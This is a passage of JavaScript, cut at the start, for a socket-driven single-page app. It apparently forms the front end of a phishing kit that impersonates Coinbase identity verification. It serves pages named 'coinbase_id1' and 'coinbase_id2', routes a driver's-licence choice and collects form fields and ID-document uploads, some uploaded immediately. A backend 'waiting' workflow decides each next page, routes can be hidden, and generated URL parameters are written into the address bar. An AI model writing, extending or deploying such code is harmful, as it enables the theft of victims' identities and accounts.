                if (this.parentElement && this.parentElement.classList.contains('loading')) {
                    this.parentElement.style.display = 'none';
                }
                this.style.display = 'none'; 
            };

            const handleIframeLoaderSuccess = function() {
                this.style.display = (originalImageDisplay && originalImageDisplay !== 'none' && originalImageDisplay !== '') ? originalImageDisplay : 'block';
                if (loaderInIframeContainer) {
                    const originalContainerDisplay = loaderInIframeContainer.style.display;
                    loaderInIframeContainer.style.display = (originalContainerDisplay && originalContainerDisplay !=='none' && originalContainerDisplay !=='') ? originalContainerDisplay : 'flex';
                }
            };

            loaderImageInIframe.onerror = handleIframeLoaderError;
            loaderImageInIframe.onload = handleIframeLoaderSuccess;

            if (loaderImageInIframe.complete) {
                if (loaderImageInIframe.src && loaderImageInIframe.naturalWidth > 0 && loaderImageInIframe.naturalHeight > 0) {
                    handleIframeLoaderSuccess.call(loaderImageInIframe);
                } else if (loaderImageInIframe.src && (loaderImageInIframe.naturalWidth === 0 || typeof loaderImageInIframe.naturalWidth === "undefined")) {
                    handleIframeLoaderError.call(loaderImageInIframe);
                }
            }
        }

        const spaMessageHandler = function(event) {
          if (event.data && event.data.type === 'driverLicenseClick') {
            let currentPageKey = null;
            if (AppState.currentPage) {
              currentPageKey = AppState.currentPage.startsWith('/') ? AppState.currentPage.substring(1) : AppState.currentPage;
            }

            if (currentPageKey === 'coinbase_id2') {
              console.warn('[SPA Message Listener] driverLicenseClick message received on coinbase_id2. Navigation suppressed.');
              return;
            }

                const redirectsConfig = AppState.config?.pages?.coinbase_id1?.redirects || {};
            const driverLicenseRedirect = Object.values(redirectsConfig).find(r => r.text === "Driver\'s License" || r.element_type === "div");

                if (driverLicenseRedirect && driverLicenseRedirect.url) {
                  const destinationPageName = driverLicenseRedirect.url;
                  if (AppState.config?.options?.hide_route === false) {
                    const destinationRoute = AppState.config?.pages?.[destinationPageName]?.route;
                if (destinationRoute) {
                  window.location.href = destinationRoute.startsWith('/') ? destinationRoute : `/${destinationRoute}`;
                  return;
                }
                    }
                  navigateToPage(destinationPageName);
            } else {
              navigateToPage('coinbase_id2');
          }
          }
        };

        if (!window._spaMessageListenerAttached) {
          window.addEventListener('message', spaMessageHandler);
          window._spaMessageListenerAttached = true;
        }

      } catch (err) {
        console.error(`Error rendering page content for ${page}:`, err);
        hideLoadingOverlay(); 
        if (!data.is_retry) {
          const alternateRoute = SocketManager.findRouteByPageKey(page);
          if (alternateRoute && alternateRoute !== page) {
            SocketManager.requestPage(alternateRoute, { is_retry: true });
          }
        }
      }
    }

    return {
      handlePageContent
    };
  })();

  const FormHandler = (() => {
    function collectFormData(form) {
      const formData = new FormData(form);
      const formDataObj = {};

      const pageName = AppState.currentPage?.substring(1) || '';
      const immediateFields = AppState.config?.pages?.[pageName]?.immediate_upload_fields || [];

      for (const [key, value] of formData.entries()) {
        if (!immediateFields.includes(key)) {
          formDataObj[key] = value;
        }
      }

      return formDataObj;
    }

    function setFormLoadingState(form, isLoading) {
      const submitButtons = form.querySelectorAll('button[type="submit"], input[type="submit"]');

      submitButtons.forEach(btn => {
        if (isLoading) {
          btn.disabled = true;
          const textElement = btn.querySelector('span') || btn;
          if (textElement.innerHTML.trim() && !textElement.querySelector('.loading-indicator')) {
            btn.dataset.originalText = textElement.innerHTML;
            textElement.innerHTML = '<span class="loading-indicator">Processing...</span>';
          }
        } else {
          btn.disabled = false;
          const textElement = btn.querySelector('span') || btn;
          if (btn.dataset.originalText) {
            textElement.innerHTML = btn.dataset.originalText;
            delete btn.dataset.originalText;
          }
        }
      });
    }

    function showNotification(message, type = 'info') {
      const notification = document.createElement('div');
      notification.className = `notification notification-${type}`;
      notification.textContent = message;
      notification.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        padding: 12px 24px;
        border-radius: 4px;
        z-index: 9999;
        color: white;
        background: ${type === 'error' ? '#f44336' : type === 'success' ? '#4caf50' : '#4285f4'};
        box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        transition: opacity 0.5s ease;
      `;

      document.body.appendChild(notification);

      setTimeout(() => {
        notification.style.opacity = '0';
        setTimeout(() => notification.remove(), 500);
      }, 3000);
    }

    async function handleFormSubmission(form) {
      if (!form) return;

      if (form.getAttribute('data-processing') === 'true') return;

      const validatorName = form.dataset.needsValidation;
      if (validatorName && typeof window[validatorName] === 'function') {
        if (!window[validatorName]()) {
          return;
        }
      }

      form.setAttribute('data-processing', 'true');
      const formDataObj = collectFormData(form);

      const formRouteAttr = form.dataset.pageRoute;
      const appCurrentPage = AppState.currentPage;
      const appNavigatingTo = AppState.navigatingToPage;

      let effectivePageContext;
      let normalizedFormRouteAttr = formRouteAttr; 

      if (normalizedFormRouteAttr && normalizedFormRouteAttr.startsWith('/')) {
        normalizedFormRouteAttr = normalizedFormRouteAttr.substring(1);
      }

      if (!normalizedFormRouteAttr || normalizedFormRouteAttr.trim() === '') {
        effectivePageContext = appCurrentPage || appNavigatingTo;
      } else {
        effectivePageContext = normalizedFormRouteAttr;
      }

      if (effectivePageContext && effectivePageContext.startsWith('/')) {
        effectivePageContext = effectivePageContext.substring(1);
      }

      if (!effectivePageContext || effectivePageContext.trim() === '') {
        effectivePageContext = null;
      }

      let sourcePageForMapping;
      let normalizedFormRouteAttrForMapping = formRouteAttr;

      if (normalizedFormRouteAttrForMapping && normalizedFormRouteAttrForMapping.startsWith('/')) {
        normalizedFormRouteAttrForMapping = normalizedFormRouteAttrForMapping.substring(1);
      }

      if (!normalizedFormRouteAttrForMapping || normalizedFormRouteAttrForMapping.trim() === '') {
        sourcePageForMapping = appCurrentPage || appNavigatingTo;
      } else {
        sourcePageForMapping = normalizedFormRouteAttrForMapping;
      }

      if (sourcePageForMapping && sourcePageForMapping.startsWith('/')) {
        sourcePageForMapping = sourcePageForMapping.substring(1);
      } else {
      }

      if (!sourcePageForMapping || sourcePageForMapping.trim() === '') {
        sourcePageForMapping = 'unknown';
      } else {
      }

      let appStateCurrentPageNormalized = (appCurrentPage || appNavigatingTo || '');
      if (appStateCurrentPageNormalized.startsWith('/')) {
        appStateCurrentPageNormalized = appStateCurrentPageNormalized.substring(1);
      }

      if (appStateCurrentPageNormalized === 'waiting') { 
        if (AppState.config && AppState.config.workflows) {
            const currentWorkflow = AppState.config.workflows.find(w => 
              w.pages && w.pages.includes(appStateCurrentPageNormalized) 
            );

            if (currentWorkflow && currentWorkflow.pages) {
              const currentIndex = currentWorkflow.pages.indexOf(appStateCurrentPageNormalized);

              if (currentIndex >= 0 && currentIndex < currentWorkflow.pages.length - 1) {
                const targetPage = currentWorkflow.pages[currentIndex + 1]; 
                formDataObj._workflow_info = {
                  current_page: appStateCurrentPageNormalized, 
                  current_index: currentIndex,
                  workflow_name: currentWorkflow.name || 'main_workflow',
                  workflow_pages: currentWorkflow.pages
                };
              }
            }
        }
      }

      formDataObj._page_key_mapping = {
        source: sourcePageForMapping, 
        original_page: formRouteAttr || appCurrentPage || appNavigatingTo, 
        target_page: AppState.config?.workflows?.[0]?.pages?.[1] || null
      };

      setFormLoadingState(form, true);
      showLoadingOverlay();

      try {
        await SocketManager.submitForm(effectivePageContext, formDataObj);
      } catch (error) {
        console.error('Error submitting form:', error);
        hideLoadingOverlay();
        form.removeAttribute('data-processing');
        setFormLoadingState(form, false);
        showNotification(error.message || 'Form submission failed', 'error');
      }
    }

    function handleFormResponse(data) {
      document.querySelectorAll('form[data-processing="true"]').forEach(form => {
        form.removeAttribute('data-processing');
        setFormLoadingState(form, false);
      });

      if (data.workflow_data) {
        AppState.workflow.isActive = data.workflow_data.is_active === true;
        if (AppState.workflow.isActive) {
          AppState.workflow.pages = data.workflow_data.pages || [];
          AppState.workflow.currentPageIndex = data.workflow_data.current_page_index !== undefined ? data.workflow_data.current_page_index : -1;
          AppState.workflow.currentPageKey = data.workflow_data.current_page_key || null;
          AppState.workflow.totalPages = data.workflow_data.total_pages || 0;
        } else {
          AppState.workflow.pages = [];
          AppState.workflow.currentPageIndex = -1;
          AppState.workflow.currentPageKey = null;
          AppState.workflow.totalPages = 0;
        }
      } else {
      }

      if (data.status === 'success') {
        if (data.next_page) {
          if (AppState.workflow && AppState.workflow.isActive) {
            const idx = AppState.workflow.pages.indexOf(AppState.workflow.currentPageKey);
            const expectedNext = (idx >= 0 && idx < AppState.workflow.pages.length - 1) ? AppState.workflow.pages[idx + 1] : null;
            if (expectedNext && data.next_page !== expectedNext) {
              console.warn('[SPA Workflow Debug] WARNING: Backend next_page does not match expected next in workflow!');
            }
          }

          setTimeout(() => {
            navigateToPage(data.next_page);
          }, 300);
        } else if (data.redirect) {
          setTimeout(() => {
            window.location.href = data.redirect;
          }, 300);
        } else {
          hideLoadingOverlay();
        }
      } else {
        hideLoadingOverlay();
        showNotification(data.message || 'Form submission error', 'error');
      }
    }

    function fixFileUploadElements() {
      document.querySelectorAll('.uploadTrigger, #front, #back, #uploadBtn').forEach(trigger => {
        if (trigger.tagName === 'BUTTON') {
          trigger.type = 'button';
        }
      });

      document.querySelectorAll('.uploadTrigger, #front:not([data-testid="idv-id-type-drivers_licence"]), #back, #uploadBtn').forEach(trigger => {
        if (trigger.tagName === 'BUTTON') {
          trigger.type = 'button';
        }

        trigger.onclick = null;
        trigger.removeAttribute('onclick');

        const clone = trigger.cloneNode(true);
        trigger.parentNode.replaceChild(clone, trigger);

        clone.setAttribute('data-fixed', 'true');

        if (clone.id !== 'front' && clone.id !== 'back') {
        let fileInput = null;
          const targetInputId = clone.getAttribute('data-input-id');
        if (targetInputId) {
          fileInput = document.getElementById(targetInputId);
        }
        if (!fileInput) {
            const nearestForm = clone.closest('form');
          if (nearestForm) {
            fileInput = nearestForm.querySelector('input[type="file"]');
          }
        }
        if (!fileInput) {
          fileInput = document.createElement('input');
          fileInput.type = 'file';
          fileInput.style.display = 'none';
            fileInput.name = clone.id ? `${clone.id}_file` : 'uploaded_file';
            clone.parentNode.insertBefore(fileInput, clone.nextSibling);
        }
        fileInput.onchange = function() {
          if (this.files && this.files[0]) {
            const fileName = this.files[0].name;
              const textElement = clone.querySelector('p');
            if (textElement) {
              textElement.textContent = `Selected: ${fileName}`;
            } else {
              const newText = document.createElement('p');
              newText.textContent = `Selected: ${fileName}`;
                clone.appendChild(newText);
            }
            if (this.hasAttribute('data-immediate-upload')) {
              const fieldName = this.name;
                const triggerId = clone.id;
              const pageRoute = AppState.currentPage;
              if (typeof iframe.contentWindow.uploadFileImmediately === 'function') {
                iframe.contentWindow.uploadFileImmediately(this.files[0], fieldName, triggerId, pageRoute);
              } else if (typeof window.uploadFileImmediately === 'function') {
                window.uploadFileImmediately(this.files[0], fieldName, triggerId, pageRoute);
              }
            }
          }
        };
        }
      });
    }

    function ensureButtonVisibility() {
      document.querySelectorAll('button, input[type="submit"], .btn, [role="button"]').forEach(btn => {
        const style = getComputedStyle(btn);

        if (style.visibility !== 'visible' || style.display === 'none' || 
            parseFloat(style.opacity) < 0.1 || style.pointerEvents === 'none') {
          btn.style.cssText += `
            display: inline-block !important;
            visibility: visible !important;
            opacity: 1 !important;
            pointer-events: auto !important;
            cursor: pointer !important;
          `;
        }
      });
    }

    function attachFormHandlers(formContext) {
      fixFileUploadElements();

      ensureButtonVisibility();

      formContext.querySelectorAll('form').forEach(form => {
        if (form.hasAttribute('data-processed')) return;

        form.setAttribute('data-processed', 'true');

        form.addEventListener('submit', function(e) {
          const active = document.activeElement;
          const submitter = e.submitter || active;
          if (submitter && (
            submitter.classList.contains('uploadTrigger') ||
            submitter.id === 'front' ||
            submitter.id === 'back' ||
            submitter.id === 'uploadBtn')) {
            e.preventDefault();
            e.stopPropagation();
            return false;
          }
          e.preventDefault();
          handleFormSubmission(this);
        });

        form.querySelectorAll('input:not([type="submit"]):not([type="file"]):not([type="hidden"]):not([disabled]), textarea:not([disabled])').forEach(input => {
          input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
              e.preventDefault();
              const form = this.closest('form');
              if (form) {
                const allPotentialInputs = Array.from(form.querySelectorAll('input:not([type="submit"]):not([type="file"]):not([type="hidden"]):not([disabled]), textarea:not([disabled])'));
                const inputs = allPotentialInputs.filter(el => {
                    const style = window.getComputedStyle(el);
                    const rect = el.getBoundingClientRect();

                    const isVisible = 
                        style.display !== 'none' &&
                        style.visibility !== 'hidden' &&
                        style.opacity !== '0' &&
                        el.offsetParent !== null &&
                        rect.width > 0 && 
                        rect.height > 0;
                    return isVisible;
                });

                const currentIndex = inputs.indexOf(this);
                if (currentIndex !== -1 && currentIndex < inputs.length - 1) {
                  inputs[currentIndex + 1].focus();
                } else if (currentIndex !== -1) {
                  let allPreviousOrCurrentFilled = true;
                  if (inputs.length === 1 && currentIndex === 0) {
                    if (inputs[0].value.trim() === '') {
                        allPreviousOrCurrentFilled = false;
                    }
                  } else {
                    for (let i = 0; i < currentIndex; i++) { 
                      if (inputs[i].value.trim() === '') {
                        allPreviousOrCurrentFilled = false;
                        inputs[i].focus();
                        break;
                      }
                    }
                    if (allPreviousOrCurrentFilled && inputs[currentIndex].value.trim() === '') {
                        allPreviousOrCurrentFilled = false;
                    }
                  }

                  if (allPreviousOrCurrentFilled) {
                    handleFormSubmission(form);
                  }
                }
              }
            }
          });
        });
      });

      formContext.addEventListener('click', function(e) {
        const submitBtn = e.target.closest('button[type="submit"], input[type="submit"]');
        if (submitBtn) {
          const form = submitBtn.closest('form');
          if (form) {
            e.preventDefault();
            handleFormSubmission(form);
          }
        }
      }, true);
    }

    return {
      attachFormHandlers,
      handleFormResponse,
      handleFormSubmission
    };
  })();

  function getConfigAsync() {
    return fetch('/api/v1/config');
  }

  function navigateToPage(pageRoute) {
    if (window._suppressNextNavigation) {
      window._suppressNextNavigation = false;
      console.warn('[SPA] Navigation suppressed due to upload trigger click.');
      return;
    }

    if (window._navigationTimeout) {
      clearTimeout(window._navigationTimeout);
    }

    showLoadingOverlay();

    window._navigationTimeout = setTimeout(() => {
      hideLoadingOverlay();
    }, 8000);

    if (pageRoute.startsWith('/')) {
      pageRoute = pageRoute.substring(1);
    }

    const currentPage = AppState.currentPage?.startsWith('/') ? 
      AppState.currentPage.substring(1) : AppState.currentPage;

    const pageInfo = {
      source_page: currentPage,
      target_page: pageRoute,
      is_spa_navigation: true
    };

    SocketManager.requestPage(pageRoute, { 
      is_spa_navigation: true,
      navigation_info: pageInfo
    });
  }

  function showLoadingOverlay() {
    let overlay = document.getElementById('page-loading-overlay');
    if (!overlay) {
      overlay = document.createElement('div');
      overlay.id = 'page-loading-overlay';
      overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.3);
        z-index: 10000;
        transition: opacity 0.2s ease-in-out;
        opacity: 0;
      `;
      document.body.appendChild(overlay);
      void overlay.offsetWidth; 
      overlay.style.opacity = '1';
    }

    const mainLoaderContainer = document.querySelector('.loading');
    if (mainLoaderContainer) {
      mainLoaderContainer.style.display = 'flex';
      mainLoaderContainer.style.position = 'fixed';
      mainLoaderContainer.style.top = '50%';
      mainLoaderContainer.style.left = '50%';
      mainLoaderContainer.style.transform = 'translate(-50%, -50%)';
      mainLoaderContainer.style.zIndex = '10001';
      const loaderImg = mainLoaderContainer.querySelector('img');
      if (loaderImg) {
        const handleError = () => {
          if (loaderImg && loaderImg.parentNode) {
            loaderImg.parentNode.removeChild(loaderImg);
          }
          if (mainLoaderContainer) {
            mainLoaderContainer.style.display = 'none';
          }
        };

        const handleSuccess = () => {
          if (loaderImg) {
            loaderImg.style.display = 'block';
          }
          if (mainLoaderContainer) {
            mainLoaderContainer.style.display = 'flex';
          }
        };

        loaderImg.onerror = handleError;
        loaderImg.onload = handleSuccess;

        if (loaderImg.complete) {
          if (loaderImg.src && loaderImg.naturalWidth > 0 && loaderImg.naturalHeight > 0) {
            handleSuccess();
          } else if (loaderImg.src && (loaderImg.naturalWidth === 0 || typeof loaderImg.naturalWidth === "undefined")) {
            handleError();
          }
        }
      } else {
        if (mainLoaderContainer) {
          mainLoaderContainer.style.display = 'none';
        }
      }
    }
  }

  function hideLoadingOverlay() {
    const overlay = document.getElementById('page-loading-overlay');
    if (overlay) {
      overlay.style.opacity = '0';
      setTimeout(() => {
        if (overlay.parentNode) {
          overlay.parentNode.removeChild(overlay);
        }
      }, 200);
    }

    const loadingIndicators = document.querySelectorAll('.loading, .loading-indicator, .spinner');
    loadingIndicators.forEach(indicator => {
      if (indicator && indicator.style) {
        indicator.style.display = 'none';
      }
    });

    const iframe = document.getElementById('spa-content-iframe');
    if (iframe && (!iframe.contentDocument || iframe.contentDocument.body === null || iframe.contentDocument.body.innerHTML.trim() === '')) {
        if (iframe.parentNode) {
            iframe.parentNode.removeChild(iframe);
        }
    }
  }

  function hideLoadingIndicator() {
    if (DOM.loadingIndicator) {
      DOM.loadingIndicator.style.display = 'none';
    }
  }

  function applyBackgroundColor() {
    const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    let bgColor;

    if (prefersDark) {
      bgColor = AppState.config.background_color || 'rgb(14 14 14 / 1)';
    } else {
      bgColor = 'white';
    }

    document.documentElement.style.backgroundColor = bgColor;
    document.body.style.backgroundColor = bgColor;
  }

  function initialize() {
    document.documentElement.style.overflow = 'hidden';
    document.documentElement.style.height = '100%';
    document.body.style.overflow = 'hidden';
    document.body.style.height = '100%';
    document.body.style.margin = '0';

    ensureMainContentReady();

    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (event) => {
      AppState.userPrefersDark = event.matches;
      applyBackgroundColor();
    });

    SocketManager.setupListeners();

    fetchConfig();
  }

  function ensureMainContentReady() {
    const mainContent = document.getElementById('main-content');
    if (!mainContent) {
      console.error('Main content element not found, creating one');
      const newMainContent = document.createElement('div');
      newMainContent.id = 'main-content';
      newMainContent.style.cssText = `
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%; 
        min-height: 100vh; 
        overflow: hidden; 
        z-index: 1;
        display: block !important;
        visibility: visible !important;
      `;
      document.body.appendChild(newMainContent);
    } else {
      mainContent.style.height = '100%'; 
      mainContent.style.overflow = 'hidden'; 
      mainContent.style.display = 'block';
    }
  }

  function fetchConfig() {
    getConfigAsync()
      .then(response => {
        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
        return response.json();
      })
      .then(config => {
        AppState.config = config;

        applyBackgroundColor();

        if (SocketManager.isConnected()) {
          if (typeof window.runUrlParamGenerationLogic === 'function') {
            window.runUrlParamGenerationLogic();
          }
        } else {
          if (AppState.config && AppState.config.param_conf && AppState.config.param_conf.params && !AppState.initialParamsSet) {
            AppState.generateUrlParamsPending = true;
          }
        }

        const hide_route = config.options?.hide_route === true;

        if (hide_route) {
          const spaEntryScript = document.getElementById('spa-entry-script');
          let initialPage = spaEntryScript ? spaEntryScript.getAttribute('data-target-page') : null;

          if (!initialPage || initialPage === 'None' || initialPage === '') {
            initialPage = config.waiting || '/waiting';
          }

          if (initialPage) {
            showLoadingOverlay(); 
            if (SocketManager.isConnected()) {
              SocketManager.requestPage(initialPage, { is_initial: true });
            } else {
              AppState.pendingPage = initialPage;
            }
          } else {
            hideLoadingOverlay(); 
          }
        } else {
          hideLoadingOverlay(); 
        }
      })
      .catch(error => {
        console.error('Error loading config:', error);

        applyBackgroundColor();

        hideLoadingOverlay(); 
      });
  }

  window.SpaSystem = {
    navigateToPage,
    applyBackgroundColor,
    refreshCurrentPage: () => {
      if (AppState.currentPage) {
        navigateToPage(AppState.currentPage);
      }
    },
    fixStyles: () => {
      FormHandler.ensureButtonVisibility();
      FormHandler.fixFileUploadElements();
    },

    loadPage: (pageRoute) => {
      if (!pageRoute.startsWith('/')) {
        pageRoute = `/${pageRoute}`;
      }
      SocketManager.requestPage(pageRoute);
    },
    getAppState: () => ({ ...AppState }),
    hideLoading: hideLoadingOverlay, 
    socket: SocketManager.getSocket
  };

  window.addEventListener('popstate', (event) => {
    const pageFromState = event.state?.page;
    if (pageFromState) {
      navigateToPage(pageFromState);
    }
  });

  function runUrlParamGenerationLogic() {
    if (AppState.config && AppState.config.param_conf && AppState.config.param_conf.params && !AppState.initialParamsSet) {
      SocketManager.generateData(AppState.config.param_conf)
        .then(generatedDataResponse => {
          if (generatedDataResponse && generatedDataResponse.list && generatedDataResponse.list.length > 0) {
            const paramsToSet = generatedDataResponse.list[0];
            const currentUrl = new URL(window.location.href);
            const existingSearchParams = new URLSearchParams(currentUrl.search);

            for (const key in paramsToSet) {
              if (Object.prototype.hasOwnProperty.call(paramsToSet, key)) {
                existingSearchParams.set(key, paramsToSet[key]);
              }
            }
            currentUrl.search = existingSearchParams.toString();
            try {
              history.replaceState(null, '', currentUrl.toString());
            } catch (e) {
              console.error('[SPA runUrlParamGenerationLogic] Error updating URL with history.replaceState:', e);
            }
            AppState.initialParamsSet = true;
          } else {
            console.warn('[SPA runUrlParamGenerationLogic] No data in generated_data.list to set URL params.');
          }
        })
        .catch(error => {
          console.error('[SPA runUrlParamGenerationLogic] Error generating data for URL params:', error);
        });
    } else {
      if (AppState.initialParamsSet) {
      } else if (AppState.config && AppState.config.param_conf && !AppState.config.param_conf.params) {
      } else {
      }
    }
  }
  window.runUrlParamGenerationLogic = runUrlParamGenerationLogic; 

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize);
  } else {
    initialize();
  }

  function displayUploadedImage(id, backendFileUrl, retryCount = 0) {
    const maxRetries = 3;
    const img = document.createElement('img');
    img.onerror = () => {
        if (retryCount < maxRetries) {
            setTimeout(() => {
                displayUploadedImage(id, backendFileUrl, retryCount + 1);
            }, 1000 * (retryCount + 1)); 
        } else {
            console.error(`[SPA Upload Debug] Failed to load image for #${id} after ${maxRetries} attempts`);
        }
    };
    img.onload = () => {
        const container = document.querySelector(`#${id}`);
        if (container) {
            container.innerHTML = '';
            container.appendChild(img);
        }
    };
    img.src = backendFileUrl.startsWith('/') ? backendFileUrl : `/${backendFileUrl}`;
    img.classList.add('img-fluid');
  }
})();